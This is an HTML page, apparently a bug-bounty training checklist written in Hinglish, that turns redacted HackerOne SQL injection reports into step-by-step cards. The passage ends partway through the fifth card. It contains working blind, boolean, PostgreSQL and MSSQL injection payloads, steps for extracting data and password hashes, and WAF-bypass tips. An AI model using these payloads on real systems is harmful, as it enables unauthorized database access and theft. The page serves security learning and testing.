@@ -1,0 +1,2562 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mission 12 â€” SQL Injection Master Checklist</title>
+    <meta name="description"
+        content="30 HackerOne SQLi reports across 6 phases: Blind/Time-Based, WAF Bypass, Sneaky Points, Modern APIs, OOB, and Advanced Chaining.">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;700&display=swap"
+        rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box
+        }
+
+        :root {
+            --bg: #0a0a0f;
+            --surface: #12121a;
+            --surface2: #1a1a26;
+            --border: #2a2a3a;
+            --text: #e0e0f0;
+            --text2: #8888aa;
+            --accent: #f59e0b;
+            --accent2: #fbbf24;
+            --glow: rgba(245, 158, 11, 0.15);
+            --critical: #ef4444;
+            --high: #f97316;
+            --medium: #eab308;
+            --green: #22c55e
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            min-height: 100vh
+        }
+
+        code.c {
+            background: #1e1e2e;
+            padding: 2px 7px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: .82em;
+            color: var(--accent2);
+            border: 1px solid #2a2a3a
+        }
+
+        /* â•â•â• HEADER â•â•â• */
+        .mission-header {
+            background: linear-gradient(135deg, #0f0f18 0%, #1a1020 50%, #0f0f18 100%);
+            border-bottom: 2px solid var(--accent);
+            padding: 40px 24px 32px;
+            text-align: center;
+            position: relative;
+            overflow: hidden
+        }
+
+        .mission-header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(ellipse at 50% 0%, rgba(245, 158, 11, 0.08) 0%, transparent 70%);
+            pointer-events: none
+        }
+
+        .mission-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--accent), #d97706);
+            color: #000;
+            font-weight: 800;
+            padding: 6px 20px;
+            border-radius: 20px;
+            font-size: .75rem;
+            letter-spacing: 2px;
+            margin-bottom: 12px
+        }
+
+        .mission-title {
+            font-size: clamp(1.6rem, 4vw, 2.4rem);
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--accent), #fde68a, var(--accent2));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px
+        }
+
+        .mission-subtitle {
+            color: var(--text2);
+            font-size: .95rem;
+            max-width: 700px;
+            margin: 0 auto 20px
+        }
+
+        .stats-row {
+            display: flex;
+            justify-content: center;
+            gap: 32px;
+            flex-wrap: wrap;
+            margin-top: 16px
+        }
+
+        .stat-box {
+            text-align: center
+        }
+
+        .stat-value {
+            font-size: 1.8rem;
+            font-weight: 900;
+            color: var(--accent)
+        }
+
+        .stat-label {
+            font-size: .7rem;
+            color: var(--text2);
+            letter-spacing: 1.5px;
+            text-transform: uppercase
+        }
+
+        /* â•â•â• MASTER PROGRESS â•â•â• */
+        .master-progress {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            margin: 20px auto;
+            max-width: 900px;
+            border-radius: 12px;
+            padding: 16px 24px
+        }
+
+        .master-progress-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px
+        }
+
+        .master-progress-label {
+            font-size: .8rem;
+            font-weight: 700;
+            color: var(--text2);
+            letter-spacing: 1px;
+            text-transform: uppercase
+        }
+
+        .master-bar-wrap {
+            height: 10px;
+            background: #1a1a2e;
+            border-radius: 8px;
+            overflow: hidden
+        }
+
+        .master-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--accent), var(--accent2));
+            border-radius: 8px;
+            transition: width .5s ease
+        }
+
+        /* â•â•â• FILTER BAR â•â•â• */
+        .filter-bar {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            padding: 16px;
+            flex-wrap: wrap;
+            max-width: 900px;
+            margin: 0 auto
+        }
+
+        .filter-btn {
+            background: var(--surface2);
+            color: var(--text2);
+            border: 1px solid var(--border);
+            padding: 7px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: .78rem;
+            font-weight: 600;
+            transition: all .2s
+        }
+
+        .filter-btn:hover,
+        .filter-btn.active {
+            background: var(--accent);
+            color: #000;
+            border-color: var(--accent)
+        }
+
+        /* â•â•â• PHASE SECTIONS â•â•â• */
+        .phase-section {
+            max-width: 960px;
+            margin: 28px auto;
+            padding: 0 16px
+        }
+
+        .phase-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--border);
+            flex-wrap: wrap
+        }
+
+        .phase-number {
+            background: linear-gradient(135deg, var(--accent), #d97706);
+            color: #000;
+            font-weight: 900;
+            padding: 4px 14px;
+            border-radius: 6px;
+            font-size: .75rem;
+            letter-spacing: 1.5px
+        }
+
+        .phase-title {
+            font-weight: 700;
+            font-size: .95rem;
+            color: var(--text);
+            flex: 1
+        }
+
+        .phase-count {
+            font-size: .75rem;
+            color: var(--accent);
+            font-weight: 700
+        }
+
+        .cards-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 16px
+        }
+
+        /* â•â•â• REPORT CARDS â•â•â• */
+        .report-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            transition: all .3s
+        }
+
+        .report-card:hover {
+            border-color: var(--accent);
+            box-shadow: 0 0 20px var(--glow)
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            padding: 16px 20px;
+            background: var(--surface2);
+            gap: 12px
+        }
+
+        .report-number {
+            font-size: .72rem;
+            font-weight: 700;
+            color: var(--accent);
+            letter-spacing: 1px
+        }
+
+        .report-title {
+            font-size: 1rem;
+            font-weight: 800;
+            color: var(--text);
+            margin: 4px 0
+        }
+
+        .report-target {
+            font-size: .78rem;
+            color: var(--text2)
+        }
+
+        .severity-badge {
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-size: .7rem;
+            font-weight: 800;
+            letter-spacing: 1px;
+            white-space: nowrap;
+            height: fit-content
+        }
+
+        .sev-critical {
+            background: rgba(239, 68, 68, .15);
+            color: var(--critical);
+            border: 1px solid rgba(239, 68, 68, .3)
+        }
+
+        .sev-high {
+            background: rgba(249, 115, 22, .15);
+            color: var(--high);
+            border: 1px solid rgba(249, 115, 22, .3)
+        }
+
+        .sev-medium {
+            background: rgba(234, 179, 8, .15);
+            color: var(--medium);
+            border: 1px solid rgba(234, 179, 8, .3)
+        }
+
+        .technique-tag {
+            display: inline-block;
+            background: rgba(245, 158, 11, .08);
+            color: var(--accent2);
+            border: 1px solid rgba(245, 158, 11, .2);
+            padding: 2px 10px;
+            border-radius: 4px;
+            font-size: .7rem;
+            font-weight: 600;
+            margin: 2px 4px 2px 0
+        }
+
+        .card-body {
+            padding: 16px 20px
+        }
+
+        /* â•â•â• SCENARIO / BOXES â•â•â• */
+        .scenario-box {
+            background: linear-gradient(135deg, rgba(245, 158, 11, .05), rgba(245, 158, 11, .02));
+            border: 1px solid rgba(245, 158, 11, .15);
+            border-radius: 8px;
+            padding: 14px;
+            margin-bottom: 16px
+        }
+
+        .scenario-label {
+            font-size: .7rem;
+            font-weight: 800;
+            color: var(--accent);
+            letter-spacing: 1.5px;
+            margin-bottom: 6px
+        }
+
+        .scenario-text {
+            font-size: .85rem;
+            color: var(--text2);
+            line-height: 1.7
+        }
+
+        .mindset-box {
+            background: linear-gradient(135deg, rgba(34, 197, 94, .05), rgba(34, 197, 94, .02));
+            border: 1px solid rgba(34, 197, 94, .15);
+            border-radius: 8px;
+            padding: 14px;
+            margin-top: 12px
+        }
+
+        .mindset-label {
+            font-size: .7rem;
+            font-weight: 800;
+            color: var(--green);
+            letter-spacing: 1.5px;
+            margin-bottom: 4px
+        }
+
+        .mindset-text {
+            font-size: .83rem;
+            color: var(--text2);
+            line-height: 1.6;
+            font-style: italic
+        }
+
+        .protip-box {
+            background: linear-gradient(135deg, rgba(99, 102, 241, .06), rgba(99, 102, 241, .02));
+            border: 1px solid rgba(99, 102, 241, .2);
+            border-radius: 8px;
+            padding: 14px;
+            margin-top: 12px
+        }
+
+        .protip-label {
+            font-size: .7rem;
+            font-weight: 800;
+            color: #818cf8;
+            letter-spacing: 1.5px;
+            margin-bottom: 4px
+        }
+
+        .protip-text {
+            font-size: .83rem;
+            color: var(--text2);
+            line-height: 1.6
+        }
+
+        .impact-box {
+            background: linear-gradient(135deg, rgba(239, 68, 68, .06), rgba(239, 68, 68, .02));
+            border: 1px solid rgba(239, 68, 68, .15);
+            border-radius: 8px;
+            padding: 14px;
+            margin-top: 12px
+        }
+
+        .impact-label {
+            font-size: .7rem;
+            font-weight: 800;
+            color: var(--critical);
+            letter-spacing: 1.5px;
+            margin-bottom: 4px
+        }
+
+        .impact-text {
+            font-size: .83rem;
+            color: var(--text2);
+            line-height: 1.6
+        }
+
+        .chain-box {
+            background: linear-gradient(135deg, rgba(168, 85, 247, .06), rgba(168, 85, 247, .02));
+            border: 1px solid rgba(168, 85, 247, .2);
+            border-radius: 8px;
+            padding: 14px;
+            margin-top: 12px
+        }
+
+        .chain-label {
+            font-size: .7rem;
+            font-weight: 800;
+            color: #a855f7;
+            letter-spacing: 1.5px;
+            margin-bottom: 4px
+        }
+
+        .chain-formula {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: .8rem;
+            color: #c084fc;
+            word-break: break-all
+        }
+
+        /* â•â•â• CHECKLIST â•â•â• */
+        .checklist-label {
+            font-size: .72rem;
+            font-weight: 800;
+            color: var(--accent);
+            letter-spacing: 1.5px;
+            margin-bottom: 8px
+        }
+
+        .checklist {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-bottom: 14px
+        }
+
+        .checklist-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 8px 10px;
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all .2s;
+            user-select: none
+        }
+
+        .checklist-item:hover {
+            border-color: rgba(245, 158, 11, .3)
+        }
+
+        .checklist-item.done {
+            border-color: rgba(34, 197, 94, .3);
+            background: rgba(34, 197, 94, .04)
+        }
+
+        .checklist-item.done .item-checkbox {
+            background: var(--green);
+            border-color: var(--green)
+        }
+
+        .checklist-item.done .item-checkbox::after {
+            content: 'âœ“';
+            color: #fff;
+            font-size: .65rem;
+            font-weight: 900
+        }
+
+        .item-checkbox {
+            min-width: 18px;
+            height: 18px;
+            border: 2px solid #444;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 1px;
+            transition: all .2s
+        }
+
+        .item-step {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: .7rem;
+            font-weight: 700;
+            color: var(--accent);
+            min-width: 20px
+        }
+
+        .item-text {
+            font-size: .82rem;
+            color: var(--text2);
+            line-height: 1.5
+        }
+
+        .item-text strong {
+            color: var(--text);
+            font-weight: 700
+        }
+
+        /* â•â•â• CARD PROGRESS â•â•â• */
+        .card-progress {
+            margin-top: 14px;
+            padding-top: 12px;
+            border-top: 1px solid var(--border)
+        }
+
+        .card-progress-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px
+        }
+
+        .card-progress-label {
+            font-size: .68rem;
+            font-weight: 700;
+            color: var(--text2);
+            letter-spacing: 1px;
+            text-transform: uppercase
+        }
+
+        .card-progress-pct {
+            font-size: .72rem;
+            font-weight: 800;
+            color: var(--accent)
+        }
+
+        .card-bar-wrap {
+            height: 5px;
+            background: #1a1a2e;
+            border-radius: 4px;
+            overflow: hidden
+        }
+
+        .card-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--accent), var(--green));
+            border-radius: 4px;
+            transition: width .4s
+        }
+
+        /* â•â•â• FOOTER â•â•â• */
+        .mission-footer {
+            text-align: center;
+            padding: 40px 20px;
+            border-top: 1px solid var(--border);
+            margin-top: 40px
+        }
+
+        .footer-text {
+            font-size: .75rem;
+            color: var(--text2);
+            letter-spacing: 2px
+        }
+    </style>
+</head>
+
+<body>
+    <!-- â•â•â• HEADER â•â•â• -->
+    <header class="mission-header">
+        <div class="mission-badge">â¬¡ MISSION 12 â€” SQL INJECTION</div>
+        <h1 class="mission-title">ðŸ’‰ SQL INJECTION MASTER CHECKLIST</h1>
+        <p class="mission-subtitle">30 HackerOne Reports Â· Blind/Time-Based Â· WAF Bypass Â· Sneaky Points Â· Modern APIs Â·
+            OOB Â· Advanced Chaining Â· Total Bounty: $170,000+</p>
+        <div class="stats-row">
+            <div class="stat-box">
+                <div class="stat-value">30</div>
+                <div class="stat-label">REPORTS</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value">6</div>
+                <div class="stat-label">PHASES</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="completedItems">0</div>
+                <div class="stat-label">STEPS DONE</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="completedCards">0</div>
+                <div class="stat-label">CARDS DONE</div>
+            </div>
+        </div>
+    </header>
+    <div class="master-progress">
+        <div class="master-progress-header"><span class="master-progress-label">OVERALL MASTERY</span><span
+                class="master-progress-label" id="masterPct">0%</span></div>
+        <div class="master-bar-wrap">
+            <div class="master-bar-fill" id="masterBar"></div>
+        </div>
+    </div>
+    <div class="filter-bar">
+        <button class="filter-btn active" onclick="filterCards('all',this)">All Reports</button>
+        <button class="filter-btn" onclick="filterCards('critical',this)">ðŸ”´ Critical</button>
+        <button class="filter-btn" onclick="filterCards('high',this)">ðŸŸ  High</button>
+        <button class="filter-btn" onclick="filterCards('complete',this)">âœ… Complete</button>
+        <button class="filter-btn" onclick="filterCards('incomplete',this)">â¬œ Incomplete</button>
+    </div>
+
+    <!-- â•â•â• PHASE 1 â€” BLIND & TIME-BASED CORE â•â•â• -->
+    <section class="phase-section" id="phase1">
+        <div class="phase-header"><span class="phase-number">PHASE 01</span><span class="phase-title">BLIND & TIME-BASED
+                CORE â€” MySQL Â· PostgreSQL Â· MSSQL Â· Boolean</span><span class="phase-count" id="p1count">0 / 5
+                reports</span></div>
+        <div class="cards-grid" id="grid-phase1">
+
+            <!-- #01 Time-Based Blind -->
+            <div class="report-card" data-severity="critical" id="report-01">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">â—ˆ REPORT #01 Â· Total #320</div>
+                        <div class="report-title">Time-Based Blind SQLi â€” Email Verification Endpoint</div>
+                        <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Global SaaS) Â· $5,000 Â· 9.8 CVSS</div>
+                        <div style="margin-top:8px"><span class="technique-tag">SLEEP()</span><span
+                                class="technique-tag">POST Parameter</span><span class="technique-tag">URL
+                                Encoding</span></div>
+                    </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                        <div class="scenario-text">POST <code class="c">/api/v2/verify-email</code> mein <code
+                                class="c">verification_token</code> parameter. Single quote <code class="c">'</code>
+                            lagane par server response delay. Payload: <code
+                                class="c">token=ABCDEF' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--</code> â†’ 10.05 sec
+                            delay â†’ SQLi Confirm! Phir <code
+                                class="c">IF(SUBSTR(database(),1,1)='s', SLEEP(5), 0)</code> se ek-ek character
+                            brute-force â†’ Admin password hash extract!</div>
+                    </div>
+                    <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Token parameters dhoondho</strong> â€” <code
+                                    class="c">verification_token</code>, <code class="c">reset_token</code>, <code
+                                    class="c">confirm_code</code> = direct DB query.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Single quote test karo</strong> â€” Token ke end mein <code
+                                    class="c">'</code> lagao. Response delay ya error = injectable.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>SLEEP() confirm karo</strong> â€” <code
+                                    class="c">' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--</code> bhejo. Exact 10s delay
+                                = Blind SQLi.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>URL encode karo</strong> â€” WAF bypass ke liye payload ko <code
+                                    class="c">%27</code>, <code class="c">%20</code> format mein bhejo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>Character extraction script</strong> â€” <code
+                                    class="c">IF(SUBSTR(database(),1,1)='a', SLEEP(5), 0)</code> se ek-ek letter
+                                nikalo.</span>
+                        </li>
+                    </ul>
+                    <div class="mindset-box">
+                        <div class="mindset-label">ðŸ§  MASTER TIP</div>
+                        <div class="mindset-text">"Verification Tokens aur Reset Tokens kabhi mat chhodo. Developers
+                            sochte hain ye random strings hain, par backend mein ye WHERE clause ke andar query hoti
+                            hain."</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- #02 Boolean-Based Blind -->
+            <div class="report-card" data-severity="high" id="report-02">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">â—ˆ REPORT #02 Â· Total #321</div>
+                        <div class="report-title">Boolean-Based Blind SQLi â€” Product Comparison Feature</div>
+                        <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Fashion E-commerce) Â· $3,500 Â· 8.7 CVSS</div>
+                        <div style="margin-top:8px"><span class="technique-tag">IF(ASCII(SUBSTR()))</span><span
+                                class="technique-tag">GET Parameter</span><span class="technique-tag">True/False
+                                Diff</span></div>
+                    </div><span class="severity-badge sev-high">ðŸŸ  HIGH</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                        <div class="scenario-text"><code class="c">/compare?p1=101&p2=102</code> â€” Product comparison.
+                            <code
+                                class="c">p1=101 AND (SELECT IF(ASCII(SUBSTR(database(),1,1))=83, 1, (SELECT 1 UNION SELECT 2)))</code>.
+                            ASCII 83 = 'S' â†’ Product dikhaya (TRUE). ASCII 84 â†’ Error (FALSE). Character-by-character DB
+                            schema + version leak!</div>
+                    </div>
+                    <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Comparison/Filter features scan karo</strong> â€” <code
+                                    class="c">p1</code>, <code class="c">p2</code>, <code class="c">compare_id</code>
+                                mein DB queries hoti hain.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>TRUE/FALSE diff pakdo</strong> â€” <code
+                                    class="c">AND 1=1</code> vs <code class="c">AND 1=2</code>. Response size, text, ya
+                                status code mein fark?</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>ASCII + SUBSTR use karo</strong> â€” <code
+                                    class="c">IF(ASCII(SUBSTR(user(),1,1))=114, 1, 0)</code> se character match
+                                karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Burp Intruder automate karo</strong> â€” Numbers payload (32-126
+                                ASCII) se brute-force karo.</span>
+                        </li>
+                    </ul>
+                    <div class="protip-box">
+                        <div class="protip-label">ðŸ’¡ PRO TIP</div>
+                        <div class="protip-text">ASCII(SUBSTR()) WAF bypass karta hai â€” WAF "SELECT password" block
+                            karta hai par "ASCII value 83" ko normal math samajh kar chhod deta hai.</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- #03 PostgreSQL pg_sleep -->
+            <div class="report-card" data-severity="critical" id="report-03">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">â—ˆ REPORT #03 Â· Total #322</div>
+                        <div class="report-title">PostgreSQL pg_sleep â€” API Filtering Blind SQLi</div>
+                        <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (ERP SaaS) Â· $6,000 Â· 9.1 CVSS</div>
+                        <div style="margin-top:8px"><span class="technique-tag">pg_sleep()</span><span
+                                class="technique-tag">|| Operator</span><span class="technique-tag">sort
+                                Parameter</span></div>
+                    </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                        <div class="scenario-text"><code class="c">/api/v1/inventory?sort=created_at</code>. PostgreSQL
+                            <code class="c">||</code> concatenation operator. Payload: <code
+                                class="c">sort=created_at || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)</code>
+                            â†’ 10s delay! Phir <code class="c">current_setting('is_superuser')='on'</code> check â†’ Delay
+                            = DB Admin confirmed!</div>
+                    </div>
+                    <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>DB fingerprint karo</strong> â€” <code class="c">::text</code>
+                                success ya <code class="c">||</code> concatenation kaam = PostgreSQL confirmed.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>pg_sleep() test karo</strong> â€” MySQL ka <code
+                                    class="c">SLEEP()</code> yahan error dega, <code class="c">pg_sleep(5)</code> use
+                                karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Privileges check karo</strong> â€” <code
+                                    class="c">current_setting('is_superuser')</code> ya <code
+                                    class="c">SELECT usename FROM pg_user</code>.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Stacked queries try karo</strong> â€” PostgreSQL <code
+                                    class="c">;</code> support karta hai = multiple queries ek saath.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>Quotes bypass karo</strong> â€” <code
+                                    class="c">CHR(65)||CHR(66)</code> = 'AB' bina quotes ke.</span>
+                        </li>
+                    </ul>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- #04 MSSQL WAITFOR -->
+            <div class="report-card" data-severity="critical" id="report-04">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">â—ˆ REPORT #04 Â· Total #323</div>
+                        <div class="report-title">MSSQL WAITFOR DELAY â€” ASP.NET Search SQLi</div>
+                        <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Health Insurance) Â· $4,200 Â· 9.3 CVSS</div>
+                        <div style="margin-top:8px"><span class="technique-tag">WAITFOR DELAY</span><span
+                                class="technique-tag">.aspx Extension</span><span
+                                class="technique-tag">IS_SRVROLEMEMBER</span></div>
+                    </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                        <div class="scenario-text"><code class="c">/Search.aspx?cat=123</code> â€” .aspx = ASP.NET +
+                            MSSQL. Payload: <code class="c">cat=123'; WAITFOR DELAY '0:0:10'--</code> â†’ 10s delay.
+                            Privilege check: <code
+                                class="c">'; IF (IS_SRVROLEMEMBER('sysadmin')=1) WAITFOR DELAY '0:0:10'--</code> â†’ Delay
+                            = sysadmin confirmed! RCE tak possible!</div>
+                    </div>
+                    <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Extension check karo</strong> â€” <code class="c">.aspx</code>
+                                ya <code class="c">.asp</code> = 99% MSSQL. Seedha MSSQL payloads try karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>WAITFOR DELAY test karo</strong> â€” <code
+                                    class="c">' WAITFOR DELAY '0:0:5'--</code> (MySQL SLEEP yahan fail hoga).</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Error-based confirm karo</strong> â€” <code
+                                    class="c">CAST('test' AS INT)</code> â†’ "Conversion failed" = SQLi confirmed.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Stacked queries test karo</strong> â€” MSSQL <code
+                                    class="c">;</code> support karta hai â†’ <code class="c">; EXEC ...</code> commands
+                                possible.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>sa user check karo</strong> â€” <code
+                                    class="c">IS_SRVROLEMEMBER('sysadmin')</code> = "Boss" status confirm.</span>
+                        </li>
+                    </ul>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- #05 Boolean Blind Order -->
+            <div class="report-card" data-severity="high" id="report-05">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">â—ˆ REPORT #05 Â· Total #324</div>
+                        <div class="report-title">Boolean Blind SQLi â€” Order Status Tracking</div>
+                        <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (EU Logistics) Â· $3,000 Â· 8.5 CVSS</div>
+                        <div style="margin-top:8px"><span class="technique-tag">AND 1=1</span><span
+                                class="technique-tag">SUBSTRING()</span><span class="technique-tag">True/False
+                                Pattern</span></div>
+                    </div><span class="severity-badge sev-high">ðŸŸ  HIGH</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                        <div class="scenario-text"><code class="c">/track?order_id=12345</code> â†’ "Order Found". <code
+                                class="c">12345' AND 1=1--</code> â†’ "Order Found" (TRUE). <code
+                                class="c">12345' AND 1=2--</code> â†’ "Invalid Order" (FALSE). Data extraction: <code
+                                class="c">12345' AND (SELECT SUBSTRING(user(),1,1))='r'--</code> â†’ TRUE = user starts
+                            with 'r' (root)!</div>
+                    </div>
+                    <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>TRUE/FALSE diff identify karo</strong> â€” Word count, response
+                                size, ya specific text ka farq pakdo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Logic test karo</strong> â€” <code class="c">' AND 1=1--</code>
+                                vs <code class="c">' AND 1=2--</code> bhej kar response compare karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>SUBSTRING/SUBSTR use karo</strong> â€” <code
+                                    class="c">SUBSTR()</code>, <code class="c">SUBSTRING()</code>, ya <code
+                                    class="c">MID()</code> characters nikalne ke liye.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>LENGTH() pehle check karo</strong> â€” <code
+                                    class="c">LENGTH(database()) > 5</code> se DB name ki length guess karo.</span>
+                        </li>
